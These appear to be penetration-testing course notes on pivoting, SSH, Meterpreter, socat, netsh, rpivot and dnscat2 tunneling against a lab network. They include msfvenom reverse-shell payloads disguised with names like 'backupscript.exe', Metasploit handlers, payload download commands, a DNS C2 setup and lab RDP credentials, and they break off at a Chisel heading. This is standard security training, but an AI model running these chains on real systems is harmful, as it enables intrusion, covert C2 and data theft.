# Introduction to Pivoting, Tunneling, and Port Forwarding
## Pivoting
- **Definition**: Using a compromised host to move into unreachable network segments.
- **Purpose**: Access isolated networks by defeating segmentation (physical or virtual).
- **Key Steps**:
  - Check privileges, network connections, and VPN/remote access.
  - Identify multi-adapter hosts to move across network segments.
- **Terms**: Pivot Host, Proxy, Foothold, Beachhead System, Jump Host.
- **Example**: Using a dual-homed workstation to cross enterprise and operational network boundaries.

---

## Lateral Movement
- **Definition**: Technique to move across hosts, services, or applications within the same network.
- **Purpose**: Expand access, escalate privileges, and compromise additional systems.
- **Example**:
  - Gain initial access → Find more hosts → Use same credentials to compromise other hosts.
- **Resources**:
  - [Palo Alto Networks Explanation](https://www.paloaltonetworks.com)
  - [MITRE Explanation](https://attack.mitre.org)

---

## Tunneling
- **Definition**: Encapsulating traffic into another protocol to hide its intent and route through barriers.
- **Purpose**: Obfuscate actions, avoid detection, and enable secure data transfer (e.g., payload delivery, C2 traffic).
- **Techniques**:
  - Use protocols like HTTPS, HTTP, or SSH to mask traffic.
  - Example: Hiding C2 traffic in HTTP GET/POST requests to appear as normal web traffic.

---

## Comparison
| **Aspect**        | **Lateral Movement**                      | **Pivoting**                              | **Tunneling**                             |
|--------------------|-------------------------------------------|-------------------------------------------|-------------------------------------------|
| **Objective**     | Expand within the same network            | Cross network boundaries                  | Obfuscate/mask traffic                    |
| **Scope**         | Hosts, applications, and services         | Network segments                          | Protocols for secure/encrypted transport  |
| **Example**       | Reuse credentials on multiple hosts       | Use dual-homed host to cross networks     | Hide C2 traffic in HTTP requests          |

---
# The Networking Behind Pivoting
## IP Addressing & NICs
- **IP Address:** Essential for communication on any network.
  - **Dynamic IPs**: Assigned by DHCP servers.
  - **Static IPs**: Common for critical devices (e.g., servers, routers, printers).
- **NIC (Network Interface Controller):** 
  - Each NIC is tied to an IP address. 
  - Multiple NICs = Multiple networks.
- **Tools to Check NICs:**
  - **Linux/macOS:**
    ```
    ifconfig
    ```
  - **Windows:**
    ```
    ipconfig
    ```

### Example: `ifconfig` Output
```bash
eth0: inet 134.122.100.200 (Public IP)
eth1: inet 10.106.0.172 (Private IP)
tun0: inet 10.10.15.54 (VPN)
lo: inet 127.0.0.1 (Loopback)
```
- **Public vs. Private IPs:**  
  - **Public IPs:** Routable over the internet.  
  - **Private IPs:** Internal use; require NAT for internet access.

---

## Routing
- **Routing Table:** Maps destinations to interfaces or gateways.
  - **Linux Command:**
    ```
    netstat -r
    ```
    or
    ```
    ip route
    ```
  - **Example:**
    ```bash
    Destination     Gateway         Iface
    default         178.62.64.1     eth0
    10.10.10.0      10.10.14.1      tun0
    ```
  - **Default Route:** Used for unknown networks.

- **Key Terms:**
  - **Gateway:** IP of the device forwarding traffic (e.g., router).
  - **Pivoting Tip:** Identify routes to new networks from compromised hosts.

---

## Protocols, Services & Ports
- **Protocols:** Rules for communication (e.g., HTTP, SSH, SMB).
- **Ports:**
  - Logical identifiers for applications on a device.
  - **Example:**
    - Port 80 (HTTP): Open for web server traffic.
  - **Pivoting Tip:** Use firewall-allowed ports to create backdoors (e.g., reverse shells).

---

# Dynamic Port Forwarding with SSH and SOCKS Tunneling

## What is Port Forwarding?  
- Redirects traffic from one port to another.  
- Uses **TCP** for communication.  
- Encapsulates forwarded traffic using protocols like **SSH** or **SOCKS**.  
- Helps bypass firewalls and pivot to other networks.

---

## SSH Local Port Forwarding  

### Scenario:  
- Attack host: `10.10.15.x`.  
- Target server: `10.129.x.x`.  
- **Goal**: Access MySQL (local to the server on port `3306`) from your machine.  

### Steps:  

1. **Scan Target for Open Ports**  
   ```bash
   nmap -sT -p22,3306 10.129.202.64
   ```
   - Output:  
     - Port `22` (SSH): **Open**.  
     - Port `3306` (MySQL): **Closed** for external access.  

2. **Forward Local Port with SSH**  
   ```bash
   ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
   ```
   - **Command Breakdown**:  
     - `-L`: Forward local port.  
     - `1234`: Local port on your machine.  
     - `localhost:3306`: Target's MySQL port.  

3. **Verify Forwarding**  
   - Check using `netstat`:  
     ```bash
     netstat -antp | grep 1234
     ```
   - Verify with `nmap`:  
     ```bash
     nmap -v -sV -p1234 localhost
     ```
     - Output: Port `1234/tcp` now connects to MySQL.

4. **Access MySQL Locally**  
   - Use `127.0.0.1:1234` to connect.  

---

## Why Port Forward?  
- **MySQL is local to the target** (binds to `localhost`).  
- Without forwarding, remote exploits/tools can’t access it.  
- Forwarding makes MySQL accessible on your local machine.

---

### Forward Multiple Ports  
- Example: Forward MySQL (`3306`) and Apache (`80`).  
   ```bash
   ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
   ```

---
## Setting up to Pivot

You're looking to set up a pivot using dynamic port forwarding through SSH and SOCKS tunneling to scan a network that is not directly accessible from your attack host. Here’s a summary of the steps you’ve outlined:

#### 1. **Identify Interfaces**
- Use `ifconfig` to identify the network interfaces.
  - `ens192`: The interface connected to your attack host.
  - `ens224`: The interface communicating with a different network (172.16.5.0/23).
  - `lo`: The loopback interface.

#### 2. **Setup SSH for Dynamic Port Forwarding**
- On the compromised Ubuntu host (`WEB01`), establish an SSH connection with dynamic port forwarding using the `-D` option, which sets up a SOCKS proxy:
  ```bash
  ssh -D 9050 ubuntu@10.129.202.64
  ```
  - The `-D 9050` option tells the SSH server to listen on your local machine’s port 9050 and forward traffic via SSH to the 172.16.5.0/23 network.

#### 3. **Configure Proxychains**
- Modify the `/etc/proxychains.conf` file to route traffic through the SOCKS proxy:
  ```bash
  tail -4 /etc/proxychains.conf
  socks4 127.0.0.1 9050
  ```
- This configuration ensures that any tools you use with proxychains will send their traffic through the SOCKS proxy on port 9050.

#### 4. **Scan with Nmap via Proxychains**
- Use proxychains with Nmap to perform a network scan over the SSH tunnel:
  ```bash
  proxychains nmap -v -sn 172.16.5.1-200
  ```
  - The `-sn` flag tells Nmap to perform a ping scan (to find live hosts).
  - The traffic will be forwarded via SSH to the remote network (172.16.5.0/23).

#### 5. **Target Specific Host Scan**
- If you know a specific host (e.g., `172.16.5.19`), you can perform a more detailed scan:
  ```bash
  proxychains nmap -v -Pn -sT 172.16.5.19
  ```
  - The `-Pn` flag disables host discovery, assuming the host is up.
  - The `-sT` flag performs a full TCP connect scan.

#### 6. **Use Metasploit via Proxychains**
- You can also pivot traffic through Metasploit, using `proxychains`:
  ```bash
  proxychains msfconsole
  ```
  - This ensures that all Metasploit traffic is routed through the SOCKS proxy for attacks on the target network.

use the **rdp_scanner auxiliary module** to check if the host on the internal network is listening on **3389**.

#### Using xfreerdp with Proxychains
```
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
The xfreerdp command will require an RDP certificate to be accepted before successfully establishing the session. After accepting it, we should have an RDP session, pivoting via the Ubuntu server.

### Additional Notes:
- **Proxychains Limitations**: Proxychains only supports full TCP connect scans. If you use partial packet scans (like SYN scans), they may not work properly.
- **Firewall Considerations**: Windows machines may block ICMP (ping) by default, so host discovery checks (ping scans) might not be effective.

This approach allows you to bypass firewall restrictions and scan the network behind the compromised host.

# Remote/Reverse Port Forwarding with SSH

#### Scenario Overview:
- **Windows Target (Windows A)**: The target machine you want to exploit, which is only able to make outgoing connections to the `172.16.5.0/23` network (local network).
- **Pivot Host (Ubuntu Server)**: A host that has connectivity to both the attack host and the Windows target. It will forward traffic between the two.
- **Attack Host (Your Machine)**: The machine you're using to attack the Windows target, running tools like Metasploit to handle the payload connection.

#### Steps to Achieve Pivoting via SSH and Meterpreter Shell:

---

### 1. **Create Meterpreter Payload**:
   - Use **msfvenom** to generate a Meterpreter payload that will connect back to your listener on the attack host via the pivot host.
   - **Command**:
     ```bash
     msfvenom -p windows/x64/meterpreter/reverse_https lhost=<PivotHostIP> LPORT=8080 -f exe -o backupscript.exe
     ```
     - `lhost=<PivotHostIP>`: The IP of the pivot host (Ubuntu server), which will receive the reverse connection.
     - `LPORT=8080`: The port on the pivot host that the payload will use to connect back.
     - `-f exe`: The payload format (Windows executable).
     - `-o backupscript.exe`: Output the payload as an executable file named `backupscript.exe`.

   - **Output**: 
     - Payload size: 712 bytes.
     - Final exe size: 7168 bytes.
     - Saved as `backupscript.exe`.

---

### 2. **Configure Metasploit Handler**:
   - You need to set up a **Metasploit handler** on the attack host to listen for the reverse connection.
   - **Steps**:
     - Start `msfconsole` and use the appropriate exploit handler.
     - **Command**:
       ```bash
       msfconsole
       use exploit/multi/handler
       set payload windows/x64/meterpreter/reverse_https
       set lhost 0.0.0.0
       set lport 8000
       run
       ```
     - `payload windows/x64/meterpreter/reverse_https`: This configures Metasploit to use a reverse HTTPS Meterpreter payload.
     - `lhost 0.0.0.0`: Listen on all interfaces (useful for receiving connections on the attack host).
     - `lport 8000`: Listen on port 8000 for incoming connections.
   
   - **Output**:
     - **Metasploit** will start listening for incoming HTTPS reverse connections on `https://0.0.0.0:8000`.

---

### 3. **Transfer Payload to Pivot Host**:
   - You need to move the payload from your attack host to the pivot host (Ubuntu server).
   - **Command** (using `scp`):
     ```bash
     scp backupscript.exe ubuntu@<PivotHostIP>:~/
     ```
     - This copies the `backupscript.exe` to the home directory of the pivot host.

---

### 4. **Start HTTP Server on Pivot Host**:
   - On the pivot host (Ubuntu), you'll need to serve the payload over HTTP so the Windows target can download it.
   - **Command** (using Python3):
     ```bash
     python3 -m http.server 8123
     ```
     - This starts a simple HTTP server on port `8123` to host the payload. The Windows target will download it from this server.

---

### 5. **Download Payload on Windows Target**:
   - On the Windows target, use **PowerShell** to download the payload from the pivot host:
   - **Command**:
     ```powershell
     Invoke-WebRequest -Uri "http://<PivotHostIP>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
     ```
     - This downloads the payload (`backupscript.exe`) to the `C:\` directory on the Windows target.

---

### 6. **Set Up SSH Remote Port Forwarding**:
   - **SSH Remote Port Forwarding**: This step involves using SSH to forward traffic from the pivot host's port `8080` to the attack host's port `8000` (where your Metasploit listener is running).
   - **Command**:
     ```bash
     ssh -R <PivotHostIP>:8080:0.0.0.0:8000 ubuntu@<TargetIP> -vN
     ```
     - `-R <PivotHostIP>:8080:0.0.0.0:8000`: This forwards incoming traffic on the pivot host's IP address at port 8080 to the attack host's `0.0.0.0:8000` (Metasploit listener).
     - `-vN`: Verbose output for debugging and to avoid interactive login shell.

   - The **pivot host** will now forward any incoming connection on `8080` to the attack host's port `8000` where Metasploit is listening.

---

### 7. **Execute Payload on Windows Target**:
   - On the Windows target, run the payload you downloaded (`C:\backupscript.exe`).
   - This will trigger the reverse shell connection back to the pivot host, which will forward it to the attack host via SSH.

---

### 8. **Metasploit Listener Logs (Pivot Host)**:
   - You can monitor the logs on the pivot host to ensure the connection is being forwarded properly.
   - **Logs** (Example):
     ```
     debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
     debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
     debug1: channel 1: new [172.16.5.19]
     debug1: confirm forwarded-tcpip
     ```

   - These logs show the connection attempt from the Windows target (`172.16.5.19`) being forwarded via the pivot to the attack host.

---

### 9. **Meterpreter Session**:
   - Once the reverse shell is triggered, you'll see the following in Metasploit:
   - **Output**:
     ```
     Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1) at 2022-03-02 10:48:10 -0500
     ```
   - The **Meterpreter** session will show as coming from `127.0.0.1` (loopback) because the pivot host is forwarding the connection.
   - Use the `shell` command to interact with the target shell:
     ```bash
     meterpreter > shell
     C:\> netstat
     ```

---
# Meterpreter Tunneling & Port Forwarding
#### **Creating Payload for Ubuntu Pivot Host**
```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```
- **Purpose**: Creates a Meterpreter reverse TCP payload for a Linux target (Ubuntu in this case).
- **Explanation**: 
  - `LHOST=10.10.14.18`: Set the attacker's local IP address.
  - `LPORT=8080`: Set the listening port on the attacker's machine.
  - `-f elf`: Specifies that the payload will be generated as an ELF executable.
  - The output is saved as `backupjob`, which will be transferred to the pivot host for execution.

#### **Configuring & Starting the multi/handler**
```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```
- **Purpose**: Configures and starts a Metasploit handler to listen for the incoming reverse connection from the payload.
- **Explanation**:
  - `set lhost 0.0.0.0`: Binds to all interfaces on the attacker's machine to receive the connection.
  - `set lport 8080`: Specifies the port to listen on (must match the payload's `LPORT`).
  - `run`: Starts the handler, waiting for the payload to connect back and establish a Meterpreter session.

#### **Executing the Payload on Pivot Host**
```bash
ubuntu@WebServer:~$ ls
backupjob
ubuntu@WebServer:~$ chmod +x backupjob
ubuntu@WebServer:~$ ./backupjob
```
- **Purpose**: Executes the payload (`backupjob`) on the pivot host to establish a Meterpreter session.
- **Explanation**: 
  - The payload is made executable using `chmod +x backupjob`.
  - Then, it is executed to trigger the reverse TCP connection to the attacker's machine.

#### **Meterpreter Session Established**
```bash
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 )
meterpreter > pwd
/home/ubuntu
```
- **Purpose**: Confirms that the Meterpreter session has been successfully established.
- **Explanation**: 
  - `pwd`: Shows the current working directory of the session (`/home/ubuntu`), confirming access to the Ubuntu host.

#### **Ping Sweep on Target Network (172.16.5.0/23)**
```bash
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
- **Purpose**: Performs a ping sweep across the specified target subnet to identify live hosts.
- **Explanation**: 
  - The `ping_sweep` post-exploitation module sends ICMP requests to all hosts in the `172.16.5.0/23` range and reports back the reachable IPs.

#### **Ping Sweep for Loop (Linux Pivot)**
```bash
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
- **Purpose**: Executes a parallel ping sweep on the `172.16.5.0/23` network.
- **Explanation**: 
  - A for loop sends one ping request (`ping -c 1`) to each host from `172.16.5.1` to `172.16.5.254`.
  - `grep "bytes from"` filters the output to show only successful replies.
  - The `&` allows the pings to run in parallel for faster scanning.
#### ping sweep powershell
```
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```
#### ping sweep cmd 
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
#### **SOCKS Proxy Configuration**
```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```
- **Purpose**: Configures Metasploit's SOCKS proxy server to route traffic through the Meterpreter session.
- **Explanation**: 
  - `SRVPORT 9050`: Sets the local port for the SOCKS proxy (commonly used for Tor traffic).
  - `SRVHOST 0.0.0.0`: Allows connections from any interface (so it's accessible to the attacker's machine).
  - `version 4a`: Configures the SOCKS proxy to use SOCKS4a (commonly used with Metasploit).
  - `run`: Starts the SOCKS proxy server.

#### **Adding Proxy to proxychains.conf**
```bash
socks4  127.0.0.1 9050
```
- **Purpose**: Configures `proxychains` to route traffic through the SOCKS proxy.
- **Explanation**: 
  - Adds the proxy to the `/etc/proxychains.conf` file, allowing tools like Nmap to route their traffic via the SOCKS proxy server running on `127.0.0.1:9050`.

#### **Creating Routes with AutoRoute**
```bash
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 172.16.5.0
run
```
- **Purpose**: Configures Metasploit to route traffic from the attacker's machine through the compromised Ubuntu pivot host.
- **Explanation**: 
  - `SESSION 1`: Specifies the Meterpreter session to use for routing.
  - `SUBNET 172.16.5.0`: Adds the target subnet `172.16.5.0/23` to the routing table, allowing traffic to be forwarded via the Meterpreter session.

#### **Listing Active Routes**
```bash
meterpreter > run autoroute -p
```
- **Purpose**: Lists the active routes in the routing table, confirming the new routes for the target network.
- **Explanation**: Displays the subnets and gateways that are accessible through the Meterpreter session.

#### **Testing Proxy & Routing Functionality**
```bash
$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```
- **Purpose**: Uses `proxychains` to route an Nmap scan through the Meterpreter session and test network connectivity to the target.
- **Explanation**: 
  - The `-p3389` option scans port `3389` (RDP) on the target IP `172.16.5.19`.
  - `-sT`: Performs a TCP connect scan.
  - `-v`: Enables verbose output.
  - `-Pn`: Disables host discovery (assumes the host is up).
  
**Output**:
```bash
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```
- **Explanation**: Nmap discovers that port `3389` (RDP) is open on `172.16.5.19`, indicating that the scan successfully routed through the Meterpreter session.

## Meterpreter Port Forwarding

#### **Port Forwarding Command Syntax**
```bash
portfwd [-h] [add | delete | list | flush] [args]
```

#### **Options**
- `-h`: Help banner
- `-i <opt>`: Index of the port forward entry
- `-l <opt>`: Local port to listen on (for forwards) or connect to (for reverse)
- `-L <opt>`: Local host to listen on (optional)
- `-p <opt>`: Remote port to connect to (for forwards) or listen on (for reverse)
- `-r <opt>`: Remote host to connect to
- `-R`: Indicates reverse port forward

---

#### **Creating Local TCP Relay**
```bash
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```
- Listens on **local port 3300**.
- Forwards traffic to **172.16.5.19:3389** (RDP port).

##### **Connecting via Localhost**
```bash
$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

##### **Check Active Connections (Netstat)**
```bash
$ netstat -antp
tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp
```

---

#### **Meterpreter Reverse Port Forwarding**
```bash
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```
- Forwards **incoming traffic on Ubuntu port 1234** to **attack host port 8081**.

---

#### **Configuring and Running Listener (`multi/handler`)**
```bash
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 8081
set LHOST 0.0.0.0
run
```

---

#### **Generate Reverse Shell Payload**
```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

---

#### **Executing the Payload and Opening Meterpreter Session**
```bash
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173)
meterpreter > shell
```
- **Meterpreter session** is opened after executing the payload.

# **Socat Redirection with a Reverse Shell**

#### **What is Socat?**
- **Socat** is a powerful tool that acts as a bidirectional relay between two independent network connections.
- It can:
  - Redirect traffic from one host and port to another.
  - Handle advanced setups like SSL, raw sockets, or Unix domain sockets.
  - Create pipe-like connections between applications, replacing the need for more complex tunneling setups.

#### **How is Socat Different from Normal Port Forwarding?**
- **Normal Port Forwarding:**
  - Typically handled by tools like SSH.
  - Requires SSH access to the system performing the forwarding.
  - Simpler but less flexible (e.g., may not handle different socket types or advanced configurations).

- **Socat:**
  - Does not require SSH; can operate independently on systems without SSH access.
  - Offers advanced features, like working with different socket types (e.g., TCP, UDP, SSL, UNIX).
  - Flexible configurations allow relaying, modifying, or interacting with network traffic more dynamically.

---

#### **Key Steps**

1. **Set up Socat as a redirector:**
   - Socat listens on a local port and forwards traffic to the attacker's host and port.
   ```bash
   socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
   ```
   - **Explanation:** 
     - `TCP4-LISTEN:8080` listens on port 8080.
     - `fork` allows handling multiple simultaneous connections.
     - `TCP4:10.10.14.18:80` forwards traffic to the attacker's host (`10.10.14.18`) on port 80.

2. **Create a payload that connects to Socat:**
   ```bash
   msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080
   ```
   - **Payload details:** A reverse HTTPS payload connecting to `172.16.5.129:8080`.

3. **Transfer the payload to the target (e.g., using SCP or SMB).**

4. **Start Metasploit handler to catch the shell:**
   - **Steps:**
     ```bash
     msfconsole
     use exploit/multi/handler
     set payload windows/x64/meterpreter/reverse_https
     set lhost 0.0.0.0
     set lport 80
     run
     ```
   - **Explanation:** Listens on all interfaces (`0.0.0.0`) and port `80` for incoming connections from Socat.

5. **Run the payload on the target host.**
   - The payload sends a reverse shell connection to Socat (`172.16.5.129:8080`), which redirects it to the Metasploit listener (`10.10.14.18:80`).

6. **Receive a Meterpreter session in Metasploit:**
   ```plaintext
   [*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 )
   meterpreter > getuid
   Server username: INLANEFREIGHT\victor
   ```

---

# Socat Redirection with a Bind Shell
#### **What is a Bind Shell?**
- A **Bind Shell** is when the target machine (in this case, Windows) opens a port and listens for incoming connections from the attacker.
- The attacker connects to this port to interact with the system.
- Unlike reverse shells, where the attacker waits for a connection from the victim, bind shells allow the victim to listen and wait for an attacker’s connection.

#### **How to Set Up a Bind Shell with Socat and Metasploit**

1. **Create the Windows Bind Shell Payload:**
   - Use `msfvenom` to create a Windows bind shell payload:
   ```bash
   msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
   ```
   - **Explanation:**
     - This generates a payload that listens on port `8443` on the Windows machine.

2. **Start the Socat Listener on Ubuntu:**
   - Socat will forward connections from a listener on port `8080` to port `8443` on the Windows machine.
   ```bash
   socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
   ```
   - **Explanation:**
     - `TCP4-LISTEN:8080` makes Socat listen for incoming connections on port `8080`.
     - `TCP4:172.16.5.19:8443` forwards the traffic to the Windows target machine’s `8443` port.

3. **Start Metasploit's Bind Handler:**
   - Configure Metasploit to connect to Socat's listener, which is on `8080`.
   ```bash
   msfconsole
   use exploit/multi/handler
   set payload windows/x64/meterpreter/bind_tcp
   set RHOST 10.129.202.64
   set LPORT 8080
   run
   ```
   - **Explanation:**
     - `RHOST` is set to the Ubuntu server's IP (`10.129.202.64`) where Socat listens.
     - `LPORT` is the port Metasploit uses to connect to Socat's listener (`8080`).

4. **Execute the Payload on the Windows Target:**
   - Once the payload is executed on the target machine, it will open port `8443` for incoming connections.
   - Socat will redirect the connection to the Windows machine.

5. **Receive the Meterpreter Session:**
   - The handler in Metasploit will open a connection to the bind shell through Socat and receive the Meterpreter session.
   ```plaintext
   [*] Sending stage (200262 bytes) to 10.129.202.64
   [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
   meterpreter > getuid
   Server username: INLANEFREIGHT\victor
   ```

---

# **Using Plink.exe for SSH and SOCKS Proxy on Windows**

## **Overview**
- Use **Plink.exe** (part of PuTTY) to create a SOCKS proxy on a Windows machine during a pentest.
- Enables pivoting without introducing new tools, ideal for locked-down environments.

---

## **Steps**
1. **Create SOCKS Proxy with Plink**:
   ```bash
   plink -ssh -D 9050 ubuntu@10.129.15.50
   ```
   - `-D 9050`: Sets up SOCKS proxy on port 9050.
   - SSH connects to `ubuntu@10.129.15.50`.

2. **Configure Proxifier**:
   - **Address**: `127.0.0.1`
   - **Port**: `9050`
   - Use SOCKS v5 for routing traffic.

3. **Tunnel RDP**:
   - Start **mstsc.exe** (RDP) to connect to the target host.
   - Traffic is routed through the SOCKS proxy.

---

# SSH Pivoting with Sshuttle
## **Overview**
- **Sshuttle**: Python-based tool for SSH pivoting.
- Automates iptables setup to route traffic via a pivot host.
- Eliminates the need for Proxychains.

---

## **Steps**

### **1. Install Sshuttle**
```bash
sudo apt-get install sshuttle
```

### **2. Set Up Pivot Routing**
```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```
- `-r`: Remote SSH connection (`ubuntu@10.129.202.64`).
- `172.16.5.0/23`: Subnet to route through the pivot.

### **3. Scan or Connect**
- Example using **Nmap**:
  ```bash
  nmap -v -sV -p3389 172.16.5.19 -A -Pn
  ```
- Use tools (e.g., RDP, Nmap) without Proxychains.

---

## **Benefits**
- Streamlined SSH pivoting.
- No need for additional proxy configurations.
- Direct tool usage after setup.

# Web Server Pivoting with Rpivot
## **Overview**
- **Rpivot**: Reverse SOCKS proxy for tunneling through a compromised machine.
- Exposes internal network ports on an external server.

## **Steps**

### **1. Clone Rpivot**
```bash
git clone https://github.com/klsecservices/rpivot.git
```

### **2. Install Python 2.7**
#### **Option 1**: Using APT
```bash
sudo apt-get install python2.7
```
#### **Option 2**: Using Pyenv
```bash
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```

### **3. Start Rpivot Server**
Run on **attack host**:
```bash
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

### **4. Transfer Rpivot to Target**
Run from **attack host**:
```bash
scp -r rpivot ubuntu@<TargetIP>:/home/ubuntu/
```

### **5. Start Rpivot Client**
Run on **target machine**:
```bash
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

- `10.10.14.18`: Attack host's IP.
- `9999`: Server port.

### **6. Configure Proxychains**
Edit `proxychains.conf` to include:
```plaintext
socks4 127.0.0.1 9050
```

### **7. Access Target Web Server**
Run from **attack host**:
```bash
proxychains firefox-esr 172.16.5.135:80
```
Similar to the pivot proxy above, there could be scenarios when we cannot directly pivot to an external server (attack host) on the cloud. Some organizations have HTTP-proxy with NTLM authentication configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use rpivot's client.py in the following way:
```
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
---

## **Key Notes**
- Rpivot establishes a SOCKS proxy tunnel through a compromised machine.
- Allows access to internal web servers (e.g., `172.16.5.135:80`) from the attacker's machine using Proxychains.

# Port Forwarding with Windows Netsh

## **Overview**
`netsh.exe` is a Windows command-line tool used for network configurations, including port forwarding. It enables attackers to pivot further within a compromised network.

---

## **Scenario**
- **Compromised Host**: Windows 10 IT admin workstation.
  - IPs: `10.129.15.150` (external), `172.16.5.25` (internal).
- Goal: Forward traffic from port `8080` on the compromised host to port `3389` on the internal IP.

---

## **Steps**

### **1. Configure Port Forwarding**
Run the following command on the compromised host:
```bash
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

- **`listenport`**: Port to listen on (e.g., `8080`).
- **`listenaddress`**: External IP address of the compromised host (e.g., `10.129.15.150`).
- **`connectport`**: Target port on the internal host (e.g., `3389`).
- **`connectaddress`**: Internal host IP (e.g., `172.16.5.25`).
- *v4tov4*: Stands for IPv4-to-IPv4 forwarding.
### **2. Verify Configuration**
Run this command:
```bash
netsh.exe interface portproxy show v4tov4
```

**Example Output:**
```plaintext
Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.15.150   8080        172.16.5.25     3389
```

### **3. Connect to Forwarded Port**
From the **attack host**, connect using a tool like `xfreerdp`:
```bash
xfreerdp /u:<username> /p:<password> /v:10.129.15.150:8080
```
# DNS Tunneling with Dnscat2
## What is dnscat2?  
- A tool that uses DNS protocol for tunneling data between hosts.  
- Creates an encrypted **Command & Control (C2)** channel.  
- Uses **TXT DNS records** to send data covertly.  
- Exploits DNS resolution to bypass firewalls and exfiltrate data.  

## How it Works  
1. **DNS Redirection**:  
   - Normal DNS resolves legitimate domains via the corporate DNS server.  
   - dnscat2 requests are routed to an attacker-controlled DNS server instead.  
2. **Stealth**:  
   - Firewalls rarely monitor DNS traffic extensively, making dnscat2 stealthy.  

## Example  
### Scenario  
- **Host A**: Attacker’s machine (running dnscat2 server).  
- **Host B**: Victim's Windows machine (running dnscat2 client).  
- **Host C**: Corporate DNS server.  

### Flow  
1. **Host B** sends a DNS request for `stealthy.example.com`.  
2. The request is routed to **Host A** instead of **Host C**.  
3. Encrypted data (e.g., sensitive information or commands) is exfiltrated to **Host A**.

---

## Setting Up dnscat2  

### 1. Clone and Set Up the Server  
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

### 2. Start the dnscat2 Server  
```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```
- **host**: Attacker’s IP.  
- **port**: DNS port (53).  
- **domain**: Fake domain used for DNS queries.  

### 3. Clone dnscat2-powershell for the Client  
```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
Transfer the `dnscat2.ps1` file to the target (Host B).

---

## Using dnscat2 Client on Windows  

### 1. Import dnscat2 PowerShell Module  
```powershell
Import-Module .\dnscat2.ps1
```

### 2. Start the Client  
```powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
- **DNSserver**: Attacker’s IP.  
- **Domain**: Fake domain used by the server.  
- **PreSharedSecret**: Key for encryption.  

---

## Confirming the Connection  
### On the Server  
You should see:  
```plaintext
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
```

---

## Interacting with a Session  
### Switch to the Established Session  
```plaintext
window -i 1
```
#  SOCKS5 Tunneling with Chisel

**Chisel Overview**: 
- Chisel is a TCP/UDP tunneling tool written in Go.
- Uses HTTP for transporting data, secured using SSH.
- Suitable for creating a client-server tunnel in a restricted environment, like firewalls.

**Scenario**:
